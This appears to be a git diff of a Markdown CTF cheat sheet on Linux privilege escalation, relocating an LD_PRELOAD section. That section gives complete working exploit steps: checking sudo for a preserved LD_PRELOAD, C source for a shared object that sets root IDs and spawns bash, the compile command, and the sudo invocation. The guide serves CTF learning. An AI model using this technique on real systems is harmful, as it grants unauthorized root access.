@@ -164,45 +164,6 @@ Finding the Flag: Once you have root access, locate the flag and/or crack passwo
 </details>
 
 <details>
-<summary>LD_PRELOAD</summary>
- <br> 
-Environment variables:
-
-* LD_LIBRARY_PATH - A list of directories in which to search for RLF libraries at execution time.
-* LD_PRELOAD - A list of additional, user-specified, ELF shared objects to be loaded before all others.
-
-Sudo has the ability to preserve certain environment variables:
-
-
-    $ sudo -l
-    Matching Defaults entries for user on this host:
-    env_reset, env_keep+=LD_PRELOAD
-
-Compile a shared object (.so) file:
-
-
-    #include <stdio.h>
-    #include <sys/types.h>
-    #include <stdlib.h>
-
-    void _init() {
-        unsetenv("LD_PRELOAD");
-        setresuid(0,0,0);
-        setresgid(0,0,0);
-        system("/bin/bash");
-    }
-
-
-    $ gcc -fPIC -shared -nostartfiles -o preload.so preload.c
-
-Set the environment variable as part of the sudo command. The full path to the .so file needs to be used. Your user must be able to run the command via sudo.
-
-
-    $ sudo LD_PRELOAD=/full/path/tp/preload.so apache2
-    #
-</details>
-
-<details>
 <summary>CORN JOB</summary>
  <br> 
 
@@ -645,7 +606,44 @@ Linux Privilege Escalation
 * https://payatu.com/guide-linux-privilege-escalation/
 * https://github.com/Arrexel/phpbash
 </details>
+<details>
+<summary>LD_PRELOAD</summary>
+ <br> 
+Environment variables:
 
+* LD_LIBRARY_PATH - A list of directories in which to search for RLF libraries at execution time.
+* LD_PRELOAD - A list of additional, user-specified, ELF shared objects to be loaded before all others.
+
+Sudo has the ability to preserve certain environment variables:
+
+
+    $ sudo -l
+    Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+Compile a shared object (.so) file:
+
+
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+
+    void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        setresgid(0,0,0);
+        system("/bin/bash");
+    }
+
+
+    $ gcc -fPIC -shared -nostartfiles -o preload.so preload.c
+
+Set the environment variable as part of the sudo command. The full path to the .so file needs to be used. Your user must be able to run the command via sudo.
+
+
+    $ sudo LD_PRELOAD=/full/path/tp/preload.so apache2
+    #
+</details>
 <details>
 <summary>NFS</summary>
  <br> 
